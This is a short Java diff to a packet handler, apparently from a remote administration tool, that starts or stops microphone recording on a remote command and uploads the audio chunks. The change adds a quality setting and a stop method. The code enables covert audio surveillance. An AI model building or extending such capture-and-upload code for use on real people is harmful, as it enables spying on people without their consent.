@@ -8,15 +8,18 @@ public class Packet84ToggleSoundCapture extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		if (Connection.instance.readBoolean()) {
-			new Thread(new SoundWriter() {
+		boolean start = Connection.instance.readBoolean();
+		int quality = Connection.instance.readInt();
+		
+		if (start) {
+			new Thread(new SoundWriter(quality) {
 				@Override
 				public void onRead(byte[] data, int read) throws Exception {
-					Connection.instance.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read));	
+					Connection.instance.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read, quality));	
 				}
 			}).start();
 		} else {
-			SoundWriter.instance.running = false;
+			SoundWriter.instance.stop();
 		}
 	}
 
